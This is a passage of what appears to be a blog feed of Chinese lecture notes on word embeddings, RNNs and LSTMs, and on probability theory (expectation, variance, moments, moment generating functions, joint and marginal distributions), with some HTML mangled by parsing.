src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959821.png" alt=""></p><p>  每个词<strong>随机给定</strong>词向量, 并在进行训练<strong>实时更新</strong> (<strong>输入层</strong>相当于一个<strong>新增的隐含层</strong>). 通过训练语言模型, 得到词向量 (<strong>自监督</strong>).</p></li><li><p><strong>word2vec模型</strong>: 一种<strong>简化的神经网络语言模型</strong>.</p><ul><li><p><strong>连续词袋模型 (CBOW)</strong>: <strong>不考虑</strong>上下文中词的<strong>顺序</strong>.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959822.png" alt=""></p><p>  <strong>输出处理</strong>得到的 $x_w$ 的长度即为<strong>一个词向量的长度</strong>, 使用<strong>语料库预生成</strong>的 <strong>Huffman Tree</strong> 替换隐含层及输出层. <strong>每次训练</strong>时只计算<strong>与该词有关的参数</strong>, 且越是<strong>常用词</strong>涉及的<strong>参数越少</strong>, <strong>训练速度快</strong>.</p><p>  $W$ 经过霍夫曼树每个节点时的概率为:</p><script type="math/tex; mode=display">  p(d_i^w\mid x_w,\theta_{𝑖−1}^w)=      \begin{cases}      \sigma(x_w\cdot\theta_{𝑖−1}^w), & d_i^w=0\\      1-\sigma(x_w\cdot\theta_{𝑖−1}^w), & d_i^w=1      \end{cases}</script><p>  其<strong>损失函数</strong>:</p><script type="math/tex; mode=display">  L=-\sum_{i=2}^{l_w}\{(1-d_i^w)\log{[\sigma(x_w\cdot\theta_{𝑖−1}^w)]}+d_i^w\log{[1-\sigma(x_w\cdot\theta_{𝑖−1}^w)]}\}.</script></li><li><strong>跳词模型 (Skip-Gram Model)</strong>.</li></ul></li><li><p><strong>TextCNN</strong>: 词向量应用——情感分类问题.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959823.png" alt=""></p></li></ul><h2 id="循环神经网络-RNN"><a href="#循环神经网络-RNN" class="headerlink" title="循环神经网络 (RNN)"></a>循环神经网络 (RNN)</h2><ul><li><p>网络辨析:</p><ul><li><p>数据角度:</p><ul><li>序列数据.</li><li>数据之间有先后联系.</li></ul></li><li><p>网络结构角度:</p><ul><li><strong>前馈网络</strong> (<strong>CNN</strong>).</li><li><strong>反馈网络</strong> (<strong>RNN</strong>).</li></ul></li><li><p>表示角度:</p><ul><li>句子向量、序列向量.</li></ul></li></ul></li><li><p><strong>循环模块</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959824.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959825.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007947.png" alt=""></p></li><li><p><strong>循环神经网络的训练</strong>: 与具体任务结合.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007948.png" alt=""></p></li><li><p><strong>例</strong>: <strong>看图说话</strong>问题</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007949.png" alt=""></p></li><li><p><strong>双向循环神经网络</strong>: 防止<strong>序列前面的内容被后面的内容淹没</strong>.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007950.png" alt=""></p></li><li><p><strong>序列到序列循环神经网络</strong>: 机器翻译、问答系统.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007951.png" alt=""></p></li></ul><h2 id="长短期记忆网络-LSTM"><a href="#长短期记忆网络-LSTM" class="headerlink" title="长短期记忆网络 (LSTM)"></a>长短期记忆网络 (LSTM)</h2><ul><li><p>简单 <strong>RNN</strong> 存在的问题:</p><ul><li><strong>长期依赖问题</strong>.</li><li><strong>重点选择问题</strong>: 不同的任务词的重要性不同.</li></ul></li><li><p><strong>LSTM</strong> 模块:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007953.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007954.png" alt=""></p><p>  通过<strong>状态</strong>解决<strong>梯度消失问题</strong>; 通过<strong>“门”</strong>进行<strong>选择</strong>, 结构一样, 参数不同.</p><p>  同简单 <strong>RNN</strong> 一样, <strong>LSTM</strong> 模块也是<strong>共用</strong>的.</p></li><li><p><strong>LSTM</strong> 具体结构:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007955.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007956.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007957.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007958.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007959.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302007960.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Introduction to AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记4</title>
      <link href="/2023/04/11/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-4/"/>
      <url>/2023/04/11/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-4-随机变量的数字特征"><a href="#Chap-4-随机变量的数字特征" class="headerlink" title="Chap 4 随机变量的数字特征"></a>Chap 4 随机变量的数字特征</h1><h2 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h2><ul><li><p><strong>定义(期望)</strong> </p><script type="math/tex; mode=display">  E(X)=  \begin{cases}  \sum\limits_{i}x_if(x_i)\\  \int\limits_{-\infty}^{\infty}xf(x)dx\\  \end{cases}</script></li><li><p><strong>注</strong></p><ul><li>存在 $\Leftrightarrow$ 绝对收敛;</li><li><strong>(Lebesque-Stieltjes 积分)</strong>  一般定义: $E(X)=\int\limits_{-\infty}^{\infty}xdF$;</li><li>集中趋势的一种刻画;</li><li>$E((X_1,\cdots,X_n)):=(E(X_1),\cdots,E(X_n))$.</li></ul></li><li><p><strong>性质</strong></p><ul><li><script type="math/tex; mode=display">E(g(X_1,\cdots,X_n))=\begin{cases}\sum\limits_{(x_1,\cdots,x_n)\in\mathbb{R}^n} g(x_1,\cdots,x_n)f(x_1,\cdots,x_n)\\\int\limits_{\mathbb{R}^n} g(x_1,\cdots,x_n)f(x_1,\cdots,x_n)dx_1\cdots dx_n\end{cases}</script></li><li><p><strong>(线性性质)</strong>  $E(aX+bY)=aE(X)+bE(Y)$;</p></li><li><p>若 $X_1,\cdots,X_n$ 独立, 则 $E(X_1\cdots X_n)=E(X_1)\cdots E(X_n)$.</p></li></ul></li></ul><h2 id="分位数"><a href="#分位数" class="headerlink" title="分位数"></a>分位数</h2><ul><li><p><strong>定义(中位数)</strong>  $X$ 连续, 若 $P(X\le m)=\dfrac{1}{2}$, 则称 $m$ 为 $X$ 的中位数.</p></li><li><p><strong>注</strong></p><ul><li>$F(m)=\dfrac{1}{2}$;</li><li>$P(X<m)=\dfrac{1}{2}=p(x>m)$;</m)=\dfrac{1}{2}=p(x></li><li>中位数不一定唯一.</li></ul></li><li><p><strong>定义(中位数)</strong>  若 $P(X<m)\le\dfrac{1}{2}$ 且="" $p(x="">m)\le\dfrac{1}{2}$, 则称 $m$ 为 $X$ 的中位数.</m)\le\dfrac{1}{2}$></p></li><li><p><strong>定义(下侧 $\alpha-$分位数)</strong></p><p>  $\forall\alpha\in(0,1)$, 若 $P(X<a)\le\alpha$ 且="" $p(x="">a)\le 1-\alpha$, 称 $a$ 为 $X$ 的下侧 $\alpha-$分位数.</a)\le\alpha$></p></li><li><p><strong>注</strong></p><ul><li>若 $X$ 连续, 则 $P(X&lt;a)=\alpha$;</li><li>$F^{-1}(\alpha)=\inf\{x\mid F(x)\ge\alpha\}$ 为一个 $\alpha$ 分位数.</li></ul></li><li><p><strong>注</strong></p><ul><li>中位数也是集中趋势的一种刻画;</li><li>众数 (方便定义: $f(x)$ 的最大值点).</li></ul></li></ul><h2 id="方差"><a href="#方差" class="headerlink" title="方差"></a>方差</h2><ul><li><strong>定义(方差与标准差)</strong>  给出定义:<script type="math/tex; mode=display">Var(X):=E((X-E(X))^2)=E(X^2)-E^2(X);\\SD(X):=\sqrt{Var(X)}.</script></li></ul><ul><li><strong>注</strong>  刻画了数据的集中程度.</li><li><strong>性质</strong><ul><li>$Var(c)\equiv 0$;</li><li>$Var(X+c)\equiv Var(x)$;</li><li>$Var(cX)\equiv c^2Var(X)$;</li><li>$Var(X+Y)=Var(X)+Var(Y)+2E((X-E(X))(Y-E(Y)))$.</li></ul></li><li><strong>注</strong>  定义变异系数 $\dfrac{\sigma}{\mu}$.</li></ul><h2 id="协方差与相关系数"><a href="#协方差与相关系数" class="headerlink" title="协方差与相关系数"></a>协方差与相关系数</h2><ul><li><strong>定义(协方差)</strong> <script type="math/tex; mode=display">Cov(X,Y):=E((X-\mu_1)(Y-\mu_2)).</script></li></ul><ul><li><p><strong>注</strong></p><ul><li><p>$Cov(X,X)=Var(X)$;</p></li><li><p>$Cov(X,Y)=Cov(Y,X)$;</p></li><li><p>$Cov(X,Y)=E(XY)-\mu_1\mu_2=E(XY)-E(X)E(Y)$;</p></li><li><p>$Cov(aX_1+bX_2+c,Y)=aCov(X_1,Y)+bCov(X_2,Y)$.</p></li></ul></li><li><p><strong>定义(协方差矩阵)</strong>  对 $\overline{X}=(X_1,\cdots,X_n), \overline{Y}=(Y_1,\cdots,Y_n).$ 我们有协方差矩阵</p><script type="math/tex; mode=display">  \begin{aligned}  Cov(\overline{X},\overline{Y})&=(Cov(\overline{X}_i,\overline{Y}_j))_{n\times n}\\  &=E((\overline{X}-E(\overline{X}))^{T}(\overline{Y}-E(\overline{Y}))).  \end{aligned}</script></li><li><p><strong>注</strong>  方差矩阵: </p><script type="math/tex; mode=display">\begin{aligned}Var(\overline{X})&=Cov(\overline{X},\overline{Y})\\&=(Cov(\overline{X}_i,\overline{X}_j))_{n\times n}\\&=(\sigma_{ij})_{n\times n}.\end{aligned}</script></li><li><p><strong>定义(相关系数)</strong></p><script type="math/tex; mode=display">  Corr(X,Y)=\dfrac{Cov(X,Y)}{\sigma_1\sigma_2}=E(\dfrac{X-\mu_1}{\sigma_1}\cdot\dfrac{Y-\mu_2}{\sigma_2}).</script></li><li><p><strong>定理</strong></p><ul><li>若 $X,Y$ 独立, 则 $Corr(X,Y)=0$, 称为 $X,Y$ 不相关.</li><li>联合正态的特殊情况, 不相关可推出独立.</li><li>$\vert Corr(X,Y)\vert\le 1$, 等号成立当且仅当 $\exist\,a,b$ 使得 $P(Y=aX+b)=1$.</li></ul></li><li><p><strong>证明</strong>  给出引理 <strong>Schwartz 不等式</strong>: </p><script type="math/tex; mode=display">E^2(UV)\le E(U^2)E(V^2).</script><p>取等当且仅当 $\exist\,c\in\mathbb{R}$ 使得 $U=cV$. 取 $U=\dfrac{X-\mu_1}{\sigma_1},V=\dfrac{Y-\mu_2}{\sigma_2}$.</p></li><li><p><strong>注</strong></p><ul><li>$\rho:=Corr(X,Y)=\pm 1$, 则 $a=\pm\dfrac{\sigma_2}{\sigma_1}$;</li><li><p>$\rho:=Corr(X,Y)=0$ (不相关) $\not\Rightarrow$ 独立;</p><p>如 $X\sim N(0,1)$, $Y=X^2$ 不相关但是不独立.</p></li><li>相关系数为线性相关系数.</li></ul></li><li><p><strong>例</strong>  $(X_1,X_2)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则</p><script type="math/tex; mode=display">\rho=Corr(X_1,X_2).</script></li></ul><h2 id="矩"><a href="#矩" class="headerlink" title="矩"></a>矩</h2><ul><li><p><strong>定义(矩)</strong>  称</p><script type="math/tex; mode=display">  E((X-c)^k)(k=1,2,\cdots)</script><p>  为 $X$ 关于 $c$ 点的 $k$ 阶矩. 特别地, $c=0$ 对应原点矩, $c=\mu$ 对应中心矩.</p></li><li><p><strong>注</strong></p><ul><li>$E(X)=$ 1 阶原点矩, 0 $\equiv$ 1 阶中心矩;</li><li>$Var(X)=$ 2 阶中心矩;</li></ul></li><li><p><strong>定义(偏度系数)</strong></p><script type="math/tex; mode=display">  Skew(X)=\dfrac{E((X-\mu)^3)}{\sigma^3}=E\left(\left(\dfrac{X-\mu}{\sigma}\right)^3\right).</script><p>  称为 3 阶标准矩.</p></li><li><p><strong>注</strong></p><ul><li>0 $\equiv$ 1 阶标准矩, 1 $\equiv$ 2 阶标准矩.</li><li>$Skew(X)&lt;0$ 表示负偏, $Skew(X)&gt;0$ 表示正偏, 刻画非对称程度;</li><li>相比于 5 阶及以上的奇数阶矩, 3 阶矩的计算相对简单, 噪声影响较小;</li><li>不是唯一的刻画偏度的特征数.</li></ul></li><li><p><strong>定义(峰度系数)</strong></p><script type="math/tex; mode=display">  Kurt(X)=\dfrac{E((X-\mu)^4)}{\sigma^4}=E\left(\left(\dfrac{X-\mu}{\sigma}\right)^4\right).</script><p>  称为 4 阶标准矩.</p></li><li><p><strong>注</strong></p><ul><li>正态分布的峰度 $\equiv$ 3, 超额峰度 $:=Kurt(X)-3$;</li><li>$Kurt(X)&gt;3\leftrightarrow$ 尖峰厚尾;</li><li>没有一个数字特征能完美刻画尾部形.</li></ul></li></ul><h2 id="矩母函数"><a href="#矩母函数" class="headerlink" title="矩母函数"></a>矩母函数</h2><ul><li><p><strong>定义(矩母函数)</strong></p><p>若 $M_X(t)=E(e^{tX})$ 在 $t=0$ 的某个邻域内存在, 则称 $M_X(t)$ 为 $X$ 的矩母函数. 否则称 $X$ 的矩母函数 <strong>MGF</strong> 不存在.</p></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_X(t)&=E(e^{tX})\\&=\int_{0}^{\infty}e^{tx}\lambda e^{-\lambda x}dx\\&=\dfrac{\lambda}{\lambda - t},\,t<\lambda.\end{aligned}</script></li><li><p><strong>例</strong>  $X\sim N(0,1)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_X(t)&=E(e^{tX})\\&=\dfrac{1}{\sqrt{2\pi}}\int_{0}^{\infty}e^{tx}e^{-\tfrac{1}{2}x^2}dx\\&=e^{\tfrac{t^2}{2}},\,t\in\mathbb{R}.\end{aligned}</script></li><li><p><strong>性质</strong></p><ul><li>$M_X(0)\equiv 1$;</li><li>$Y=aX+b$, 则 $M_Y(t)=E(e^{t(aX+b)})=e^{tb}M_X(at)$.</li></ul></li><li><p><strong>例</strong>  $Y\sim N(\mu,\sigma^2)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_Y(t)&=e^{t\mu}M_X(\sigma t)\\&=e^{\tfrac{\sigma^2t^2}{2}+\mu t},\,t\in\mathbb{R}.\end{aligned}</script></li><li><p><strong>性质(矩母函数确定矩)</strong></p><script type="math/tex; mode=display">E(X^n)=M_X^{(n)}(0).</script></li><li><p><strong>证明</strong></p><script type="math/tex; mode=display">  \begin{aligned}  M_X^{(n)}(t)&=\sum_{n=0}^{\infty}\dfrac{M_X^{(n)}(0)}{n!}t^n.  \end{aligned}</script><p>  又因为</p><script type="math/tex; mode=display">  \begin{aligned}  M_X(t)&=E(e^{tX})\\  &=E\left(\sum_{n=0}^{\infty}\dfrac{X^n}{n!}t^n\right)\\  &=\sum_{n=0}^{\infty}\dfrac{E(X^n)}{n!}t^n.\\  \end{aligned}</script><p>  比较系数即得.</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}M_X(t)&=E(e^{tX})\\&=e^{\tfrac{t^2}{2}},\,t\in\mathbb{R}\\&=\sum_{n=0}^{\infty}\dfrac{(\tfrac{t^2}{2})^n}{n!}\\&=\sum_{n=0}^{\infty}\dfrac{(2n)!}{2^nn!}\cdot\dfrac{t^{2n}}{(2n)!}\end{aligned}</script><p>可得</p><script type="math/tex; mode=display">\begin{cases}E(X^{2n+1})\equiv 0,\\E(X^{2n})=\dfrac{(2n)!}{2^nn!}.\end{cases}</script></li><li><p><strong>性质(矩母函数确定分布)</strong></p><p>若 $\exists$ $a&gt;0$, 使得 $M_X(t)=M_Y(t)$, $\forall\,t\in(-a,a)$, 则 $X$, $Y$ 同分布.</p></li><li><p><strong>例</strong>  $M_X(t)=\dfrac{1}{4}e^{-t}+\dfrac{1}{2}+\dfrac{1}{8}e^{4t}+\dfrac{1}{8}e^{5t}$.</p></li><li><p><strong>解答</strong>  $X$ 离散, 设 $P(X=k)=p_k$, 我们有</p><script type="math/tex; mode=display">M_X(t)=E(e^{tX})=\sum_ke^{tk}p_k.</script><p>可得分布</p><script type="math/tex; mode=display">P(X=-1)=\dfrac{1}{4};\\P(X=0)=\dfrac{1}{2};\\P(X=4)=\dfrac{1}{8};\\P(X=5)=\dfrac{1}{8}.</script></li><li><p><strong>例</strong>  $f_1(x)=\dfrac{1}{\sqrt{2\pi}x}e^{-\tfrac{(\ln x)^2}{2}}, x&gt;0$, $f_2(x)=f_1(x)+f_1(x)\sin(2\pi\ln x)$.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">\begin{aligned}E(X_2^n)&=E(X_1^n)+\int_{0}^{\infty}x^nf_1(x)\sin(2\pi\ln x)dx\\&=0\,(令 \,y=\ln x-n)\\\end{aligned}</script><p>这是一个同矩不同分布的例子.</p></li><li><p><strong>性质(独立随机变量和的分布)</strong></p><p>若 $X$, $Y$ 独立, 则 $M_{X+Y}(t)=M_X(t)M_Y(t)$.</p></li><li><p><strong>证明</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  M_{X+Y}(t)&=E(e^{t(X+Y)})\\  &=E(e^{tX}e^{tY})\\  &=E(e^{tX})E(e^{tY})\\  &=M_X(t)M_Y(t).  \end{aligned}</script></li><li><p><strong>例</strong>  $X_1,X_2,\cdots,X_n$ 独立正态, 则 $X_1+X_2+\cdots+X_n$ 正态.</p></li><li><p><strong>解答</strong>  考察 $X_i\sim N(\mu_i,\sigma_i^2)$, 其中 $i=1,2$. 那么</p><script type="math/tex; mode=display">M_{X+Y}(t)=M_X(t)M_Y(t)=e^{\tfrac{1}{2}(\sigma_1^2+\sigma_2^2)+(\mu_1+\mu_2)t}.</script><p>进而得到</p><script type="math/tex; mode=display">X_1+X_2\sim N(\mu_1+\mu_2,\sigma_1^2+\sigma_2^2).</script></li><li><p><strong>注</strong></p><ul><li>若 $N$ 为有限数;</li><li>若 $N$ 为随机变量, 与 $X_i$ 独立.</li></ul></li><li><p><strong>注</strong></p><ul><li><p>$(X_1,X_2,\cdots,X_n)$ 的 <strong>MGF</strong> 为:</p><script type="math/tex; mode=display">M_{(X_1,X_2,\cdots,X_n)}(t_1,t_2,\cdots,t_n)=E(e^{t_1X_1+t_2X_2+\cdots+t_nX_n}).</script></li><li><p>特征函数 </p><script type="math/tex; mode=display">E(e^{itX}), i^2=-1.</script></li></ul></li></ul><h2 id="条件期望"><a href="#条件期望" class="headerlink" title="条件期望"></a>条件期望</h2><ul><li><p><strong>定义(条件期望)</strong></p><script type="math/tex; mode=display">E(Y\mid X\in A)=\begin{cases}\sum\limits_iy_iP(Y=y_i\mid X\in A)\\\int\limits_{-\infty}^{\infty}yf(y\mid X\in A)dy\\\end{cases}</script><script type="math/tex; mode=display">E(Y\mid x)=\begin{cases}\sum\limits_iy_iP(Y=y_i\mid X=x)\\\int\limits_{-\infty}^{\infty}yf_{Y\mid X}(y\mid x)dy\\\end{cases}</script><p>我们称 $E(Y\mid X)$ 为新的随机变量 $h(X)$, 是 $Y$ 对 $X$ 的回归函数.</p></li><li><p><strong>例</strong>  $(X,Y)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则 $E(Y\mid X)=\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(X-\mu_1)$.</p></li><li><p><strong>例</strong>  甲乙两种同类产品, 评价使用寿命为 10 年, 15 年, 市场占有率为 60%, 40%. 随机购买一件产品, 求期望寿命?</p></li><li><p><strong>解答</strong>  为 $10\times 60\%+15\times 40\%=12$ 年.</p><p>若记 $X$ 为产品类型, $Y$ 为产品寿命, 则上式可写成</p><script type="math/tex; mode=display">\begin{aligned}E(Y)&=12\\&=10\times 60\%+15\times 40\%\\&=E(Y\mid X=1)P(X=1)+E(Y\mid X=2)P(X=2)\\&=E[E(Y\mid X)].\end{aligned}</script><p>不同取值分层平均并加权.</p></li><li><p><strong>定义(全期望公式)</strong></p><script type="math/tex; mode=display">  E(Y)=E[E(Y\mid X)].</script></li><li><p><strong>证明</strong>  以连续型为例:</p><script type="math/tex; mode=display">  \begin{aligned}  E(Y\mid x)&=\int_{-\infty}^{\infty}yf_{Y\mid X}(y\mid x)dy\\  &=\int_{-\infty}^{\infty}y\dfrac{f(x,y)}{f_X(x)}dy  \end{aligned}</script><p>  从而有</p><script type="math/tex; mode=display">  \begin{aligned}  E[E(Y\mid X)]&=\int_{-\infty}^{\infty}E(Y\mid x)f_X(x)dx\\  &=\int_{-\infty}^{\infty}\int_{-\infty}^{\infty}yf(x,y)dydx\\  &=E(Y).  \end{aligned}</script></li><li><p><strong>注</strong>  一般地, $E[g(X,Y)]=E[E(g(X,Y)\mid X)]$.</p></li><li><p><strong>定理(均方最优预测)</strong></p><script type="math/tex; mode=display">E[(Y-g(X))^2]\ge E[(Y-h(X))^2]=E[(Y-E(Y\mid X))^2]</script><p>称为均方误差 <strong>MSE</strong> 下的最优预测.</p></li><li><p><strong>证明</strong></p><script type="math/tex; mode=display">  E[(Y-c)^2]\ge E[(Y-E(Y))^2].</script><p>  因此</p><script type="math/tex; mode=display">  E[(Y-g(X))^2\mid X]\ge E[(Y-E(Y\mid X))^2\mid X].</script><p>   两边对 $X$ 取均值, 可得</p><script type="math/tex; mode=display">  E[(Y-g(X))^2]\ge E[(Y-E(Y\mid X))^2].</script></li><li><p><strong>注</strong></p><ul><li><p>$E(Y\mid X)$ 依赖 $(X,Y)$ 的联合分布 (不易获取);</p></li><li><p>转而求最优线性预测:</p><script type="math/tex; mode=display">\min_{a,b}E[(Y-(aX+b))^2]\,(最小二乘法)</script></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记3</title>
      <link href="/2023/03/24/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-3/"/>
      <url>/2023/03/24/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-3-联合分布"><a href="#Chap-3-联合分布" class="headerlink" title="Chap 3 联合分布"></a>Chap 3 联合分布</h1><h2 id="随机向量"><a href="#随机向量" class="headerlink" title="随机向量"></a>随机向量</h2><ul><li><p><strong>定义(随机向量)</strong>  我们称</p><script type="math/tex; mode=display">(X_1,\cdots,X_n):\Omega\rightarrow\mathbb{R}^n</script><p>为随机向量, 当 $X_i(1\le i\le n)$ 均为随机变量.</p></li><li><p><strong>定义(联合 CDF)</strong></p><script type="math/tex; mode=display">  F(x_1,\cdots,x_n):=F(X_1\le x_1,\cdots,X_n\le x_n),\forall\,(x_1,\cdots,x_n)\in\mathbb{R}^n.</script></li><li><p><strong>注</strong>  若 $X_i:\Omega_i\rightarrow\mathbb{R}$, 需扩充 $\Omega=\Omega_1\times\cdots\Omega_n$.</p></li></ul><h2 id="离散分布"><a href="#离散分布" class="headerlink" title="离散分布"></a>离散分布</h2><ul><li><p><strong>定义(离散型随机向量)</strong> </p><script type="math/tex; mode=display">(X_1,X_2,\cdots,X_n)为离散型\Leftrightarrow X_i(1\le i\le n)为离散型.</script></li><li><p><strong>定义(概率质量函数)(PMF)</strong></p><script type="math/tex; mode=display">  \begin{aligned}  f(x_1,x_2,\cdots,x_n):&=P((X_1,X_2,\cdots,X_n)=(x_1,x_2,\cdots,x_n))\\  &= P(X_1= x_1,X_2=x_2,\cdots,X_n=x_n).  \end{aligned}</script></li></ul><ul><li><p><strong>注</strong>  $\sum\limits_{(x_1,\cdots,x_n)\in\mathbb{R}}f(x_1,\cdots,x_n)\equiv 1$.</p></li><li><p><strong>定义(多项分布)</strong>  若 $B_1, B_2\cdots,B_n$ 为互斥事件, 且 $\sum\limits_{i=1}^{n}B_i=\Omega$. 其发生的概率为 $p_1,\cdots,p_n$, 且 $\sum\limits_{i=1}^{n}p_i\equiv 1$. 满足</p><script type="math/tex; mode=display">P(X_1=k_1,\cdots,X_n=k_n)=\dfrac{N!}{k_1!\cdots k_n!}p_1^{k_1}\cdots p_n^{k_n},\,k_i\ge 0,\,\sum_{i=1}^{n}k_i=N.</script><p>其中 $\dfrac{N!}{k_1!\cdots k_n!}$ 为多项式系数.</p></li></ul><h2 id="连续分布"><a href="#连续分布" class="headerlink" title="连续分布"></a>连续分布</h2><ul><li><p><strong>定义(联合 PDF)</strong>  若存在 $f(x_1,\cdots,x_n)\ge 0$, 使得 $\forall\,Q\subset\mathbb{R}^n$ 可测, 都有</p><script type="math/tex; mode=display">P((X_1,\cdots,X_n)\in Q)=\int_Qf(x_1,\cdots,x_n)dx_1\cdots dx_n</script><p>则称 $(X_1,\cdots,X_n)$ 为连续型, $f$ 为 $(X_1,\cdots,X_n)$ 的概率密度函数 <strong>(PDF)</strong>.</p></li><li><p><strong>注</strong></p><ul><li>$\int_{\mathbb{R}}f\equiv 1$;</li><li>以 $n=2$ 为例, $F(a,b)=\int_{-\infty}^{a}(\int_{-\infty}^{b}f(s,t)dt)ds$;</li><li>$f(a,b)=\dfrac{\partial^2 F}{\partial y\partial x}(a,b),\,a.e$.</li></ul></li><li><p><strong>定义(连续分布)(矩形域)</strong></p><script type="math/tex; mode=display">  f(x,y)=  \begin{cases}  \dfrac{1}{(b-a)(d-c)}, &(x,y)\in(a,b)\times(c,d) \\  0, &otherwise \\  \end{cases}</script></li><li><p><strong>定义(二元正态分布)</strong></p><script type="math/tex; mode=display">  f(x,y)=\dfrac{1}{2\pi\sigma_1\sigma_2}\cdot\dfrac{1}{\sqrt{1-\rho^2}}e^{-\frac{1}{2(1-\rho^2)}[(\frac{x-\mu_1}{\sigma_1})^2+(\frac{y-\mu_2}{\sigma_2})^2-2\rho\frac{x-\mu_1}{\sigma_1}\frac{y-\mu_2}{\sigma_2}]},\\</script><p>  其中 $(x,y)\in\mathbb{R}^2, \vert\rho\vert&lt;1$. </p><p>  上式中 $\exp$ 的指数可视为 $-\dfrac{1}{2}\overline{X}^TW\overline{X}=-\dfrac{1}{2}\overline{AX}^T\overline{AX}$, 其 <strong>Cholesky</strong> 分解为</p><script type="math/tex; mode=display">  \overline{X}=\left(  \begin{matrix}  \dfrac{x-\mu_1}{\sigma_1}\\  \dfrac{y-\mu_2}{\sigma_2}  \end{matrix}\right),  W=\dfrac{1}{1-\rho^2}\left(  \begin{matrix}  1 &-\rho\\  -\rho &1  \end{matrix}\right)\\  \Rightarrow  A=\dfrac{1}{\sqrt{1-\rho^2}}\left(  \begin{matrix}  \pm 1 &\mp\rho\\  0 &\pm\sqrt{1-\rho^2}  \end{matrix}\right).</script></li><li><p><strong>注</strong></p><ul><li>$f(x,y)$ 的等值线图像为椭圆;</li><li>$\rho$ 的意义?</li></ul></li></ul><h2 id="边际分布"><a href="#边际分布" class="headerlink" title="边际分布"></a>边际分布</h2><ul><li><p><strong>定义(边际 CDF)</strong></p><script type="math/tex; mode=display">  F_i(x) := P(X_i\le x) = P(X_i\le x,-\infty<X_j<\infty\,(j\ne i)).</script></li><li><p><strong>连续型</strong></p><p>  $n=2$ 时</p><script type="math/tex; mode=display">  F_X(x)=P(X\le x)=P(X\le x,-\infty<Y<\infty)=\lim_{y\rightarrow\infty}F(x,y).</script><p>  $n=3$ 时</p><script type="math/tex; mode=display">  F_X(x)=P(X\le x,-\infty<Y, Z<\infty)=\lim_{y\rightarrow\infty,z\rightarrow\infty}F(x,y,z).</script><script type="math/tex; mode=display">  F_{X,Y}(x,y)=P(X\le x,Y\le y,-\infty<Z<\infty)=\lim_{z\rightarrow\infty}F(x,y,z).</script></li><li><p><strong>离散型</strong></p><p>$n=2$ 时</p><script type="math/tex; mode=display">F_X(x)=P(X\le x)=\sum\limits_{a\le x}P(X=a)=\sum\limits_{y}\sum\limits_{a\le x}P(X=a,Y=y).</script></li><li><p><strong>例(容斥原理)</strong></p><script type="math/tex; mode=display">  P(X>a,Y>b)=1-F_X(a)-F_Y(b)+F_{X,Y}(a,b).</script></li><li><p><strong>定义(边际 PDF)</strong></p><script type="math/tex; mode=display">  F_X(x) := P(X\le x) = \lim_{y\rightarrow\infty}F(x,y) = \int_{-\infty}^{x}(\int_{-\infty}^{\infty}f(s,t)dt)ds\\</script><p>  $\Rightarrow X$ 的边际 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">  f_X(x)=\int_{-\infty}^{\infty}f(x,y)dy.</script></li><li><p><strong>例</strong>  二元正态分布 $N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; 